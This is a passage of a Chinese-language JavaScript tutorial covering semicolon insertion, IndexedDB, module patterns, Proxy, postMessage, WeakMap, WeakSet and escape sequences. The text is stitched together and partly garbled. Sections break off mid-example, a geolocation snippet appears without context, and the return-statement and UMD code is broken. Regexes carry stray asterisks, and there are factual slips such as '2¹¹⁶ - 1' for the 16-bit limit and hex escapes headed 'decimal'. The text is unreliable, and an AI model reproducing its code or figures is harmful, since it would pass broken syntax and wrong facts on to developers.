  {\n  \"presets\": [\"es2015\"]\n}\n```\n\n### 6. 编辑你的 `package.json` 文件（运行 `npm\
  \ init` 时创建），并在 `scripts` 属性中添加构建脚本：\n\n```json\n{ ...\n\"scripts\": {\n... ,\n\"\
  build\": \"babel scripts --out-dir dist/scripts\" },\n...\n}\n```\n\n### 7. 享受使用\
  \ ES6/7 编程\n\n### 8. 运行以下命令将你的所有文件转译为 ES5\n\n```bash\nnpm run build\n```\n对于更复杂的项目，你可能想查看\
  \ Gulp 或 Webpack\n\n### 第 69 章：自动分号插入 - ASI\n\n#### 第 69.1 节：避免 return 语句中的分号插入\n\
  \nJavaScript 的编码规范是将块的起始括号放在与其声明相同的行上：\n\n```javascript\nif (...) {\n}\n\nfunction\
  \ (a, b, ...) {\n}\n```\n\n而不是放在下一行：\n\n```javascript\nif (...)\n{\n}\n\nfunction\
  \ (a, b, ...)\n{\n}\n```\n\n采用这种做法是为了避免在返回对象的 return 语句中插入分号：\n\n```javascript\n\
  function foo()\n{\n  return // 这里会插入一个分号，导致函数返回空内容\n  foo: 'foo' };\n}\nfoo(); //\
  \ undefined\n\nfunction properFoo() { \n  return {\n  foo: 'foo' };\n}\nproperFoo();\
  \ // { foo: 'foo' }\n```\n\n在大多数语言中，起始括号的位置仅仅取决于个人喜好，因为它对代码的执行没有实际影响。在 JavaScript\
  \ 中，如你所见，将初始括号放在下一行会导致静默错误。\n\n#### 第 69.2 节：自动分号插入规则\n\n分号插入有三条基本规则：\n\n1. 当程序从左到右解析时，遇到一个任何语法产生式都不允许的\
  \ token（称为 `offending token`），如果满足以下一一个或多个条件，则在该 offending token 之前自动插入分号：\n\n该\
  \ offending token 与上一个 token 之间至少隔着一个 `LineTerminator`。该 token 为 `}`。\n\n2. 当程序从左到右解析时，遇到输入\
  \ token 流的末尾，且解析器无法将输入 token 流解析为单一完整的 ECMAScript 程序，则在输入流的末尾自动插入一个分号。\n\n3. 当程序从左到右解析时，遇到一个某些语法产生式允许的\
  \ token，但该产生式是一个*受限产生式*，且该 token 将是紧跟受限产生式内注释 `[no LineTerminator here]` 之后的终端或非终端符号的第一个\
  \ token（因此该 token 被称为受限 token），且受限 token 与上一个 token 之间至少隔着一个 `LineTerminator`，则在该受限\
  \ token 之前自动插入分号。\n\n然而，上述规则有一个额外的覆盖条件：如果插入分号后会被解析为空空语句，或者该分号将成为 `for` 语句头部两个分号之一（参见\
  \ 12.6.3），则永远不会自动插入分号。\n\n**来源：ECMA-262 第五版 ECMAScript 规范：**\n\n#### 第 69.3 节：受自动分号插入影响的语句\n\
  \n- 空语句\n- `var` 语句\n- 表达式语句\n- `do-while` 语句\n- `continue` 语句\n- `break` 语句\n-\
  \ `return` 语句\n- `throw` 语句\n\n**示例：**\n\n当输入 token 流的末尾且解析器无法将输入 token 流解析为单一完整的程序时，则在输入流的末尾自动插入分号。\n\
  \n```javascript\na = b\n++c\n// 转换为：\na = b;\n++c;\n\nx\n++\ny\n// 转换为：x;\n++y;\n\
  ```\n\n**数组索引/字面量**\n\n```javascript\nconsole.log(\"Hello, World\")\n[1,2,3].join()\n\
  // 转换为：\nconsole.log(\"Hello, World\");\n[1,2,3].join();\n```\n\n**Return 语句：**\n\
  \n```javascript\n{\n  foo: 'foo'\n}\n```\n\n\n\n\n\n```javascript\ncase err.PERMISSION_DENIED:\n\
  return \"PERMISSION_DENIED\";\ncase err.POSITION_UNAVAILABLE:\nreturn \"POSITION_UNAVAILABLE\"\
  ;\ncase err.TIMEOUT:\nreturn \"TIMEOUT\";\ndefault:\nreturn \"UNKNOWN_ERROR\";\n\
  };\n```\n\n它可以像这样在 `geolocationFailure()` 中使用：\n\n```javascript\nvar geolocationFailure\
  \ = function(err) {\n  console.log(\"ERROR (\" + getErrorCode(err) + \"): \" + err.message);\n\
  };\n```\n\n# 第 72 章：IndexedDB\n\n## 72.1 节：打开数据库\n\n打开数据库是一个异步操作。我们需要发送一个请求来打开数据库，然后监听事件以便知道它何时准备就绪。\n\
  \n我们将打开一个名为 `DemoDB` 的数据库。如果它还不存在，会在我们发送请求时创建它。\n\n下面的数字 `2` 表示我们正在请求数据库的第 2 版本。任何时候只存在一个版本，但我们可以使用版本号来升级旧数据，正如你所看到的。\n\
  \n```javascript\nvar db = null, // 一旦获得数据库，我们就会使用它\nrequest = window.indexedDB.open(\"\
  DemoDB\", 2);\n\n// 监听成功。这会在 onupgradeneeded 运行后调用（如果运行的话）\nrequest.onsuccess =\
  \ function() {\n  db = request.result; // 我们有一个数据库了！\n  doThingsWithDB(db);\n};\n\
  \n// 如果我们的数据库之前不存在，或者比我们请求的版本旧，\n// 将触发 `onupgradeneeded` 事件。\n\n// 我们可以用它来设置新数据库并用新的数据存储升级旧数据库\n\
  request.onupgradeneeded = function(event) {\n  db = request.result;\n  // 如果 oldVersion\
  \ 小于 1，说明数据库不存在。让我们设置它\n  if (event.oldVersion < 1) {\n    // 我们将创建一个具有 `autoIncrement`\
  \ 键的新的 \"things\" 存储\n    var store = db.createObjectStore(\"things\", { autoIncrement:\
  \ true });\n  }\n  // 在数据库的版本 2 中，我们添加了一个以每个事物命命的新索引\n  if (event.oldVersion < 2)\
  \ {\n    // 加载 things 存储并创建一个索引\n    var store = request.transaction.objectStore(\"\
  things\");\n    store.createIndex(\"by_name\", \"name\");\n  }\n};\n\n// 处理任何错误\n\
  request.onerror = function() {\n  console.error(\"尝试请求数据库时出现问题！\");\n};\n```\n\n\
  ## 72.2 节：添加对象\n\n在 IndexedDB 数据库中对数据进行的任何操作都发生在事务中。关于事务有几点需要注意，在页面底部的“备注”（Remarks）部分有所提到。\n\
  \n我们将使用在 `打开数据库` 节中设置的数据库。\n\n```javascript\n// 为 things 存储创建一个新的读写事务（因为我们要更改内容）\n\
  var transaction = db.transaction([\"things\"], \"readwrite\");\n\n// 事务使用事件，就像数据库打开请求一样。让我们监听成功\n\
  transaction.oncomplete = function() {\n  console.log(\"全部完成！\");\n};\n\n// 并确保我们处理了错误\n\
  transaction.onerror = function() {\n  console.log(\"我们的事务出现问题： \", transaction.error);\n\
  };\n\n// 现在事件处理器已经设置好，让我们获取 things 存储并添加一些对象吧！\nvar store = transaction.objectStore(\"\
  things\");\n\n// 事务可以同时执行几件事。让我们从简单的插入开始\nvar request = store.add({\n  // \"things\"\
  \ 使用自动递增的键，所以我们不需要，但我们仍然可以设置\n  key: \"coffee_cup\",\n  name: \"Coffee Cup\",\n\
  \  contents: [\"coffee\", \"cream\"]\n});\n\n// 让我们监听以便查看一切是否都顺利完成\nrequest.onsuccess\
  \ = function(event) {\n  // 完成！在这里，`request.result` 将是对象的键 \"coffee_cup\"\n};\n\n\
  // 我们也可以从一个数组中添加大量事物。我们将使用自动生成的键\nvar thingsToAdd = [{ name: \"Example object\"\
  \ }, { value: \"I don't have a name\" }];\n\n// 这次我们使用更紧凑的代码并忽略插入的结果\nthingsToAdd.forEach(e\
  \ => store.add(e));\n```\n\n## 72.3 节：检索数据\n\n在 IndexedDB 数据库中对数据进行的任何操作都发生在事务中。关于事务有几点需要注意，在页面底部的“备注”（Remarks）部分有所提到。\n\
  \n我们将使用在 `打开数据库` 节中设置的数据库。\n\n```javascript\n// 创建一个新事务，我们将使用默认的 \"readonly\"模式和\
  \ things 存储\nvar transaction = db.transaction([\"things\"]);\n\n// 事务使用事件，就像数据库打开请求一样。让我们监听成功\n\
  transaction.oncomplete = function() {\n  console.log(\"全部完成！\");\n};\n\n// 并确保我们处理了错误\n\
  transaction.onerror = function() {\n  console.log(\"我们的事务出现问题： \", transaction.error);\n\
  };\n\n// 现在事件处理器已经设置好，让我们获取 things 存储并添加一些对象吧！\nvar store = transaction.objectStore(\"\
  things\");\n\nrequest.onsuccess = function(event) {\n  // 完成！在这里，`request.result`\
  \ 将是对象的键 \"coffee_cup\"\n};\n```\n\n## 72.4 节：测试 IndexedDB\n\n你可以通过检查 `window.indexedDB`\
  \ 是否存在来测试当前环境对 IndexedDB 的支持：\n\n```javascript\nif (window.indexedDB) {\n  // IndexedDB\
  \ 可用\n}\n```\n\n# 第 73 章：模块化技术\n\n## 73.1 节：ES6 模块\n\n在 ECMAScript 6 中，使用模块语法（import/export）时，每个文件都变成自己的模块。顶层函数和变量不会污染全局命名空间。为了让其他模块导入函数、类和变量，可以使用\
  \ `export` 关键字。\n\n**注意：** 虽然这是创建 JavaScript 模块的官方方法，但目前没有任何主流浏览器完全支持它。然而，ES6 模块被许多转换器支持。\n\
  \n```javascript\nexport function greet(name) {\n  console.log(\"Hello %s!\", name);\n\
  }\n\nvar myMethod = function(param) {\n  return \"Here's what you said: \" + param;\n\
  };\n\nexport {myMethod};\n\nexport class MyClass {\n  test() {}\n}\n```\n\n### 使用模块\n\
  \n导入模块只需指定它们的路径即可：\n\n```javascript\nimport greet from \"mymodule.js\";\ngreet(\"\
  Bob\");\n```\n\n这仅导入了我们 `mymodule.js` 文件中的 `greet` 方法。也可以从模块导入所有方法：\n\n```javascript\n\
  import * as myModule from \"mymodule.js\";\nmyModule.greet(\"Alice\");\n```\n\n\
  你还可以使用新名称导入方法：\n\n```javascript\nimport { greet as A, myMethod as B } from \"mymodule.js\"\
  ;\n```\n\n## 73.2 节：通用模块定义 (UMD)\n\n当我们的模块需要被多个不同的加载器导入时，就会 UMD（通用模块定义）模式。\n\n该模式本身由两部分组成：\n\
  \n1. 一个立即执行函数表达式，用于检查用户正在实现的模块加载器。它接收两个参数：`root`（指向全局作用域的 `this` 引用）和 `factory`（我们声明模块的函数）。\n\
  \n2. 一个创建模块的匿名函数。它作为第二个参数传递给模式的 IIFE 部分。该函数接收任意数量的参数来指定模块的依赖。\n\n在示例中，我们首先检查 AMD，然后是\
  \ CommonJS。如果这两个加载器都没有被使用，我们将回退到让模块及其依赖全局可用。\n\n```javascript\n(function (root,\
  \ factory) {\n  if (typeof define === 'function' && define.amd) {\n    // AMD. 注册为匿名模块。\n\
  \    define(['exports', 'b'], factory);\n  }\n});\n```\n\n\n\n\n```javascript\n\
  } else if (typeof exports === 'object' && typeof exports.nodeName !== 'string')\
  \ { // CommonJS\n  factory(exports, require('b'));\n} else {\n  // 浏览器全局\n  factory((root.commonJsStrict\
  \ = {}), root.b);\n}\n\n}(this, function (exports, b) {\n  // 以某种方式使用 b。\n  // 将属性附加到\
  \ exports 对象上以定义导出的模块属性。\n  exports.action = function () {};\n}));\n```\n\n### 第\
  \ 73.3 节：立即调用表达式 (IIFE)\n\n立即调用函数表达式可以用于创建私有作用域的同时产生公共 API。\n\n```javascript\nvar\
  \ Module = (function() {\n  var privateData = 1;\n  return {\n    getPrivateData:\
  \ function() {\n      return privateData;\n    }\n  };\n})();\n\nModule.getPrivateData();\
  \ // 1\nModule.privateData; // undefined\n```\n\n更多信息请参见模块模式（Module Pattern）。\n\n\
  ### 第 73.4 节：异步模块定义 (AMD)\n\nAMD 是一种模块定义系统，试图解决像 CommonJS 和匿名闭包等系统的某些常见问题。\n\nAMD\
  \ 通过以下方式解决这些问题：\n- 通过调用 `define()` 注册工厂函数，而不是立即执行它\n- 将依赖项作为模块名称数组传递，然后加载这些项，而不是使用全局变量\n\
  - 仅在所有依赖项加载并执行后才执行工厂函数\n- 将依赖的模块作为参数传递给工厂函数\n\n这里的关键点是，模块可以拥有依赖项，而不会在等待其加载时阻塞整个程序，无需开发者编写复杂的代码。\n\
  \n这里是一个 AMD 的示例：\n\n```javascript\n// 定义一个带有两个依赖（jQuery 和 Lodash）的模块 \"myModule\"\
  \ndefine(\"myModule\", [\"jquery\", \"lodash\"], function($, _) { \n  // 这个公共访问的对象就是我们的模块\n\
  \  // 在这里我们使用一个对象，但它可以是任何类型\n  var myModule = {};\n  var privateVar = \"此模块之外的地方看不见我\"\
  ;\n  var privateFn = function(param) {\n    return \"你刚才说的是: \" + param;\n  };\n\
  \n  myModule.version = 1;\n  myModule.moduleMethod = function() {\n    // 我们仍然可以在这里访问全局变量，但如果使用传递的参数会更好\n\
  \    return privateFn(windowTitle);\n  };\n\n  return myModule; \n});\n``` 模块也可以跳过名称成为匿名模块。这样做时，它们通常通过文件名加载。\n\
  \n```javascript\ndefine([\"jquery\", \"lodash\"], function($, _) { /* 工厂 */ });\n\
  ```\n\n它们也可以跳过依赖项：\n\n```javascript\ndefine(function() { /* 工厂 */ });\n```\n\n某些\
  \ AMD 加载器将模块定义为普通对象：`define(\"myModule\", { version: 1, value: \"sample string\"\
  \ });`。\n\n### 第 73.5 节：CommonJS - Node.js\n\nCommonJS 是一种在 Node.js 中常用的模块化模式。\n\
  \nCommonJS 系统围绕一个加载其他模块的 `require()` 函数和一个允许模块导出公共访问方法的 `exports` 属性展开。\n\n这里有一个\
  \ CommonJS 的示例，我们将加载 Lodash 和 Node.js 的 `fs` 模块：\n\n```javascript\n// 加载 fs 和 lodash，我们可以在模块内部的任何地方使用它们\n\
  var fs = require(\"fs\"),\n_ = require(\"lodash\");\n\nvar myPrivateFn = function(param)\
  \ {\n  return \"你刚才说的是: \" + param;\n};\n\n// 这里我们导出一个公共方法 `myMethod`，其他模块可以使用\n\
  exports.myMethod = function(param) {\n  return myPrivateFn(param);\n};\n```\n\n\
  你还可以使用 `module.exports` 将函数作为整个模块导出：\n\n```javascript\nmodule.exports = function()\
  \ { return \"Hello!\"; };\n```\n\n### 第 74 章：代理 (Proxy)\n\n#### 参数\n- `target`\n\
  - `handler`\n\n#### 详情\n- 目标对象，对该对象的操作（获取、设置等...）将通过 `handler` 路由\n- 一个可以定义“陷阱”（traps）的对象，用于拦截对目标对象的操作（获取、设置等...）\n\
  \nJavaScript 中的 Proxy 可用于修改在对象上的基本操作。Proxy 是 ES6 中引入的。对象上的 `Proxy` 本身是一个对象，它拥有“陷阱”。当在\
  \ Proxy 上执行操作时，可能会触发陷阱。这包括属性查找、函数调用、修改属性、添加属性等。当没有定义相应的陷阱时，操作将在代理对象上执行，就像没有 Proxy\
  \ 一样。\n\n### 第 74.1 节：代理属性查找\n\n为了影响属性查找，必须使用 `get` 处理器。\n\n在这个示例中，我们修改了属性查找，使得不仅返回值，还返回该值的类型。我们使用\
  \ `Reflect` 来简化这一操作。\n\n```javascript\nlet handler = {\n  get(target, property)\
  \ {\n    if (!Reflect.has(target, property)) {\n      return {\n        value: undefined,\n\
  \        type: 'undefined'\n      };\n    }\n    let value = Reflect.get(target,\
  \ property);\n    return {\n      value: value,\n      type: typeof value\n    };\n\
  \  }\n};\n\nlet proxied = new Proxy({foo: 'bar'}, handler);\nconsole.log(proxied.foo);\
  \ // 记录 `Object {value: \"bar\", type: \"string\"}`\n```\n\n### 第 74.2 节：简单的代理（使用\
  \ set 陷阱）\n\n此代理简单地向目标对象上设置的每个字符串属性追加字符串 \" went through proxy\"。\n\n```javascript\n\
  let object = {};\nlet handler = {\n  set(target, prop, value){ // 注意这里使用了 ES6 对象语法\n\
  \    if('string' === typeof value){\n      target[prop] = value + \" went through\
  \ proxy\";\n    }\n  }\n};\n\nlet proxied = new Proxy(object, handler);\nproxied.example\
  \ = \"ExampleValue\";\nconsole.log(object); //// 记录: { example: \"ExampleValue went\
  \ through proxy\" } // 你也可以通过 proxied.target 访问对象\n```\n\n### 第 75 章：.postMessage()\
  \ 和 MessageEvent\n\n#### 参数\n- `message`\n- `targetOrigin`\n- `transfer`（可选）\n\n\
  ### 第 75.1 节：入门\n\n#### 什么是 `.postMessage()`，我们何时以及为什么要使用它\n\n`.postMessage()` 方法是一种允许跨源脚本之间进行安全通信的方法。\n\
  \n通常情况下，两个不同的页面只有在处于相同源时才能使用 JavaScript 直接进行相互通信，即使其中一个被嵌入另一个中（例如 iframes）或者其中一个是从另一个内部打开的（例如\
  \ window.open()）。通过 `.postMessage()`，你可以在绕过这种限制的同时保持安全。\n\n**只有当你同时访问两个页面的 JavaScript\
  \ 代码时才能使用 `.postMessage()`。** 由于接收方需要验证发送方并相应地处理消息，因此你只能在你有访问权的两个脚本之间使用此方法。\n\n\
  我们将构建一个示例，向子窗口发送消息并在子窗口上显示这些消息。示例中，父页面/发送者页面假设为 `http://sender.com`，子页面/接收者页面假设为\
  \ `http://receiver.com`。\n\n#### 发送消息\n\n为了向另一个窗口发送消息，你需要该窗口对象的引用。`window.open()`\
  \ 返回新打开窗口的引用对象。要获取窗口对象引用的其他方法，请参阅此处 `otherWindow` 参数下的说明。\n\n```javascript\nvar\
  \ childWindow = window.open(\"http://receiver.com\", \"_blank\");\n```\n\n添加一个文本框和一个发送按钮，用于向子窗口发送消息。\n\
  \n```html\n<textarea id=\"text\"></textarea> <button id=\"btn\">Send Message</button>\n\
  ```\n\n当点击按钮时，使用 `.postMessage(message, targetOrigin)` 发送文本框的内容。\n\n```javascript\n\
  var btn = document.getElementById(\"btn\"), text = document.getElementById(\"text\"\
  );\nbtn.addEventListener(\"click\", function () { \n  sendMessage(text.value);\n\
  \  text.value = \"\";\n});\n\nfunction sendMessage(message) {\n  if (!message ||\
  \ !message.length) return; \n  childWindow.postMessage(JSON.stringify({\n    message:\
  \ message,\n    time: new Date()\n  }), 'http://receiver.com'); \n}\n```\n\n\n\n\
  \n\n为了发送和接收 JSON 对象而不是简单的字符串，可以使用 `JSON.stringify()` 和 `JSON.parse()` 方法。可以将 `Transfarable\
  \ Object`（传输对象）作为 `.postMessage(message, targetOrigin, transfer)` 方法的第三可选参数，但即使在现代浏览器中仍然缺乏支持。\n\
  \n在此示例中，由于我们假设接收端是 `http://receiver.com` 页面，我们将其 URL 输入为 `targetOrigin`。该参数的值必须与\
  \ `childWindow` 对象的源匹配，才能发送消息。可以使用 `*` 作为通配符，但**出于安全考虑，强烈建议**不要使用通配符，并始终将此参数设置为接收者的特定源**。\n\
  \n## 接收、验证和处理消息\n\n此部分下的代码应该放在接收端页面，在我们的示例中为 `http://receiver.com`。\n\n为了接收消息，应该监听\
  \ `window` 的 `message` 事件。\n\n```javascript\nwindow.addEventListener(\"message\"\
  , receiveMessage);\n```\n\n当接收到消息时，有几个**应该遵循的步骤以尽可能地确保安全性**。\n\n验证发送者、验证消息、处理消息\n\
  \n应该始终验证发送者，以确保消息来自信任的发送者。之后，应该对消息本身进行验证，以确保没有收到恶意内容。在这两次验证之后，就可以处理消息。\n\n```javascript\n\
  function receiveMessage(ev) {\n  // 检查 event.origin 以查看它是否为信任的发送者。\n  // 如果你有发送者的引用，请验证\
  \ event.source\n  // 我们只想接收来自 http://sender.com（我们信任的发送者页面）的消息\n  if (ev.origin\
  \ !== \"http://sender.com\" || ev.source !== window.opener) {\n    return;\n  }\n\
  \n  // 验证消息\n  // 我们要确保它是有效的 json 对象且不包含任何恶意内容\n  var data;\n  try {\n    data =\
  \ JSON.parse(ev.data);\n    // data.message = cleanseText(data.message)\n  } catch\
  \ (ex) {\n    return;\n  }\n\n  // 对接收到的消息进行任何操作\n  // 我们想将消息添加到我们的 #console div\
  \ 中\n  var p = document.createElement(\"p\");\n  p.innerText = (new Date(data.time)).toLocaleTimeString()\
  \ + \" | \" + data.message;\n  document.getElementById(\"console\").appendChild(p);\n\
  }\n```\n\n点击此处查看演示用法的 JS Fiddle。\n\n# 第 76 章：WeakMap\n\n### 章节 76.1：创建 WeakMap 对象\
  \ \n\n`WeakMap` 对象允许你存储键/值对。与 `Map` 的区别在于，键必须是对象并且是弱引用的。这意味着如果没有其他对该键的强引用，则 `WeakMap`\
  \ 中的元素可以被垃圾回收器移除。\n\n`WeakMap` 构造函数有一个可选参数，可以是任何迭代对象（例如 `Array`），其中包含作为二元素数组的键/值对。\n\
  \n```javascript\nconst o1 = {a: 1, b: 2},\no2 = {};\nconst weakmap = new WeakMap([[o1,\
  \ true], [o2, o1]]);\n```\n\n### 章节 76.2：获取关联键的值\n\n要获取与键关联的值，使用 `.get()` 方法。如果键没有关联的值，则返回\
  \ `undefined`。\n\n```javascript\nconst obj1 = {},\nobj2 = {};\nconst weakmap = new\
  \ WeakMap([[obj1, 7]]);\n\nconsole.log(weakmap.get(obj1)); // 7\nconsole.log(weakmap.get(obj2));\
  \ // undefined\n```\n\n### 章节 76.3：给键赋值\n\n要给键赋值，使用 `.set()` 方法。它返回 `WeakMap` 对象，因此你可以链式调用\
  \ `.set()` 调。\n\n```javascript\nconst obj1 = {},\nobj2 = {};\nconst weakmap = new\
  \ WeakMap();\nweakmap.set(obj1, 1).set(obj2, 2);\nconsole.log(weakmap.get(obj1));\
  \ // 1\nconsole.log(weakmap.get(obj2)); // 2\n```\n\n### 章节 76.4：检查是否存在带有键的元素\n\n\
  要检查 `WeakMap` 中是否存在指定键的元素，使用 `.has()` 方法。如果存在则返回 `true`，否则返回 `false`。\n\n```javascript\n\
  const obj1 = {},\nobj2 = {};\nconst weakmap = new WeakMap([[obj1, 7]]);\nconsole.log(weakmap.has(obj1));\
  \ // true\nconsole.log(weakmap.has(obj2)); // false\n```\n\n### 章节 76.5：删除带有键的元素\n\
  \n要删除指定键的元素，使用 `.delete()` 方法。如果元素存在并已删除，则返回 `true`，否则返回 `false`。\n\n```javascript\n\
  const obj1 = {}, obj2 = {};\nconst weakmap = new WeakMap([[obj1, 7]]);\nconsole.log(weakmap.delete(obj1));\
  \ // true\nconsole.log(weakmap.has(obj1)); // false\nconsole.log(weakmap.delete(obj2));\
  \ // false\n```\n\n### 章节 76.6：弱引用演示\n\nJavaScript 使用引用计数技术来检测未使用的对象。当对象的引用计数为 0\
  \ 时，该对象将被垃圾回收器释放。`Weakmap` 使用弱引用，不会贡献于对象的引用计数，因此它对于解决内存泄漏问题非常有用。\n\n这是一个 weakmap\
  \ 的演示。我使用了一个非常大的对象作为值，以证明弱引用不会增加引用计数。\n\n```javascript\n// 手动触发垃圾回收以确保我们处于良好状态。\n\
  > global.gc();\nundefined\n// 检查初始内存使用，heapUsed 约为 4M\n> process.memoryUsage();\n\
  { rss: 21106688, heapTotal : 7376896, heapUsed: 4153936, external: 9059 }\n\n> let\
  \ wm = new WeakMap(); undefined\n> const b = new Object(); undefined\n> global.gc();\
  \ undefined\n// heapUsed 仍然约为 4M\n> process.memoryUsage();\n{ rss: 20537344, heapTotal\
  \ : 9474048, heapUsed: 3967272, external: 8993 }\n\n// 将键值元组添加到 WeakMap 中，键是 b，值为\
  \ 5*1024*1024 数组\n> wm.set(b, new Array(5*1024*1024)); // WeakMap {}\n\n// 手动垃圾回收\n\
  > global.gc();\nundefined\n// heapUsed 仍然是 45M\n> process.memoryUsage();\n{ rss:\
  \ 62652416, heapTotal: 51437568, heapUsed: 45911664, external: 8951 }\n\n// b 置为\
  \ null\n> b = null;\nnull\n// 垃圾回收\n> global.gc();\nundefined\n// 移除对对象的引用 b 后，heapUsed\
  \ 再次变为 4M\n// 这意味着 WeakMap 中的大数组被释放了\n// 这也意味着 weakmap 对大数组没有贡献\n> process.memoryUsage();\n\
  { rss: 20639744, heapTotal : 8425472, heapUsed: 397972, external: 8956 }\n```\n\n\
  # 第 77 章：WeakSet\n\n### 章节 77.1：创建 WeakSet 对象\n\n`WeakSet` 对象用于存储弱引用的对象。与 `Set`\
  \ 的区别在于你不能存储原始值（如数字或字符串）。此外，集合中对象的引用是弱持有的，这意味着如果存储在 `WeakSet` 中的对象没有其他引用，那么它就可以被垃圾回收。\n\
  \n`WeakSet` 构造函数有一个可选参数，可以是任何迭代对象（例如 `array`）。它的所有元素都将添加到创建的 `WeakSet` 中。\n\n```javascript\n\
  const obj1 = {},\nobj2 = {};\nconst weakset = new WeakSet([obj1, obj2]);\n```\n\n\
  ### 章节 77.2：添加值\n\n要向 `WeakSet` 中添加值，使用 `.add()` 方法。该方法可以链式调用。\n\n```javascript\n\
  const obj1 = {},\nobj2 = {};\nconst weakset = new WeakSet();\nweakset.add(obj1).add(obj2);\n\
  ```\n\n### 章节 77.3：检查值是否存在\n\n要检查 `WeakSet` 中是否存在某个值，使用 `.has()` 方法。\n\n```javascript\n\
  const obj1 = {},\nobj2 = {};\nconst weakset = new WeakSet([obj1]);\nconsole.log(weakset.has(obj1));\
  \ // true\nconsole.log(weakset.has(obj2)); // false\n```\n\n### 章节 77.4：删除值\n\n\
  要从 `WeakSet` 中删除值，使用 `.delete()` 方法。如果值存在并已删除，则返回 `true`，否则返回 `false`。\n\n```javascript\n\
  const obj1 = {},\nobj2 = {};\nconst weakset = new WeakSet([obj1]);\nconsole.log(weakset.delete(obj1));\
  \ // true\nconsole.log(weakset.delete(obj2)); // false\n```\n\n# 第 78 章：转义序列\n\n\
  ### 章节 78.1：在字符串和正则表达式中输入特殊字符**\n\n\n\n\n大多数可打印字符都可以原样包含在字符串或正则表达式字面量中，例如：\n\n```javascript\n\
  var str = \"ポケモン\"; // 一个有效的字符串\n```\n\n```javascript\nvar regExp = */[*Α*-*Ωα*-*ω*]/*;\
  \ // 任何不带变音的希腊字母\n```\n\n为了在字符串或正则表达式中添加任意字符（包括不可打印字符），必须使用转义序列。转义序列由一个反斜杠（`\\\\\
  `）加上一个或多个字符组成。要为特定字符编写转义序列，通常（但并非总是）需要知道它的十六进制字符代码。\n\nJavaScript 提供了多种指定转义序列的方法，如本主题中的示例所示。例如，以下转义序列都表示相同的字符：`换行符`（Unix\
  \ 换行符），其字符代码为 `U+000A`。\n\n```\n\\n\n\\x0a\n\\u000a\n\\u{a} // ES6 新增，仅用于字符串\n\\\
  012 // 在严格模式下的字符串字面量和模板字符串中禁用\n\\cj // 仅用于正则表达式\n```\n\n## 第 78.2 节：转义序列类型\n\n###\
  \ 单字符转义序列\n\n某些转义序列由一个反斜杠加单个字符组成。\n\n例如，在 `alert(\"Hello\\nWorld\");` 中，转义序列 `\\\
  n` 用于在字符串参数中引入换行，使得 \"Hello\" 和 \"World\" 显示在连续的行上。\n\n| 转义序列 | 字符 | Unicode |\n\
  | :--- | :--- | :--- |\n| `\\b`（仅用于字符串，不在正则表达式中） | 退格 | U+0008 |\n| `\\t` | 水平制表符\
  \ | U+0009 |\n| `\\n` | 换行符 | U+000A |\n| `\\v` | 垂直制表符 | U+000B |\n| `\\f` | 换符\
  \ | U+000C |\n| `\\r` | 回车 | U+000D |\n\n此外，当 `\\0` 后面不是 0 到 7 之间的数字时，可以用于转义空字符（`U+0000`）。\n\
  \n序列 `\\\\`、`\\'` 和 `\\\"` 用于转义反斜杠后面的字符。虽然它们与非转义序列相似（其中前导反斜杠会被忽略，例如 `\\?` 表示 `?`），但根据规范，它们在字符串内部被显式处理为单字符转义序列。\n\
  \n### 十进制转义序列\n\n代码在 0 到 255 之间的字符可以使用转义序列表示，其中 `\\x` 后面跟着 2 位十六进制字符代码。例如，不换行空格字符的代码为\
  \ 160，或 16 进制下的 `A0`，因此它可以被写为 `\\xa0`。\n\n```javascript\nvar str = \"ONE\\xa0LINE\"\
  ; // ONE 和 LINE 之间有一个不换行空格\n```\n\n对于大于 9 的十六进制数字，使用字母 `a` 到 `f`，不区分小写或大写。\n\n```javascript\n\
  var regExp1 = */[\\x00-xff]/*; // 匹配 U+0000 到 U+00FF 之间的任何字符\nvar regExp2 = */[\\\
  x00-xFF]/*; // 与上相同\n```\n\n### 4 位 Unicode 转义序列\n\n代码在 0 到 65535 (2¹¹⁶ - 1) 之间的字符可以使用转义序列表示，其中\
  \ `\\u` 后面跟着 4 位十六进制字符代码。\n\n例如，Unicode 标准定义右箭头字符（`→`）的代码为 8594，或 16 进制下的 `2192`。因此，它的转义序列为\
  \ `\\u2192`。\n\n这产生了字符串 \"A → B\"：\n\n```javascript\nvar str = \"A\\u2192 B\";\n\
  ```\n\n对于大于 9 的十六进制数字，使用字母 `a` 到 `f`，不区分小写或大写。小于 4 位的十六进制代码必须左侧补零：小字母 \"z\" 使用 `\\\
  u007A`。\n\n### 花括号 Unicode 转义序列 版本 ≥ 6\n\nES6 将 Unicode 支持扩展到从 0 到 `0x10FFFF` 的完整代码范围。为了转义代码大于\
  \ 2¹¹⁶ - 1 的字符，引入了一种新的转义序列语法：\n\n```\n\\u{???}\n```\n\n其中花括号中的代码是代码点值的十六进制表示，例如：\n\
  \n```javascript\nalert(\"Look!\\u{1f440}\"); // 看！\U0001F440\n```\n\n在上面的示例中，代码\
  \ `1f440` 是 Unicode 字符 *Eyes*（眼睛）代码的十六进制表示。\n\n注意，花括号中的代码可以包含任意数量的十六进制数字，只要值不超过\
  \ `0x10FFFF`。对于大于 9 的十六进制数字，使用字母 `a` 到 `f`，不区分小写或大写。\n\n带花括号的 Unicode 转义序列仅在字符串内部有效，正则表达式无效！\n\
  \n### 八进制转义序列\n\n八进制转义序列从 ES5 起被弃用，但在正则表达式内部以及非严格模式下的非模板字符串中仍然受支持。八进制转义序列由一个、两个或三个八进制数字组成，值在\
  \ 0 到 `377` = 255 之间。\n\n例如，大写字母 \"E\" 的代码为 69，或 8 进制下的 `105`。因此，它可以用转义序列 `\\105`\
  \ 表示：\n\n```javascript\n/\\105scape/.test(\"Fun with Escape Sequences\"); // true\n\
  ```\n\n在严格模式下，字符串内部不允许使用八进制转义序列，并将产生语法错误。值得注意的是，`\\0` 与 `\\00` 或 `\\000` 不同，它*不*被视为八进制转义序列，因此在严格模式的字符串（甚至是模板字符串）中仍然允许。\n\
  \n### 控制转义序列\n\n某些转义序列仅在正则表达式字面量内部识别（不在字符串中）。这些用于转义代码在 1 到 26 之间（`U+0001–U+001A`）的字符。它们由\
  \ `\\c` 前导单个字母 `A–Z`（不区分大小写）组成。`\\c` 之后的字母顺序决定了字符代码。\n\n例如，在正则表达式中\n\n```javascript\n\
  /\\cG/\n```\n\n字母 \"G\"（字母表中第 7 个字母）指的是字符 `U+0007`，因此 `/\\cG/.test(String.fromCharCode(7));\
  \ // true\n```\n\n## 第 79 章：行为设计模式\n\n### 第 79.1 节：观察者模式\n\n观察者模式用于事件处理和委托。*主体*（subject）维护一个*观察者*（observers）集合。每当事件发生时，主体就会通知这些观察者。如果你用过\
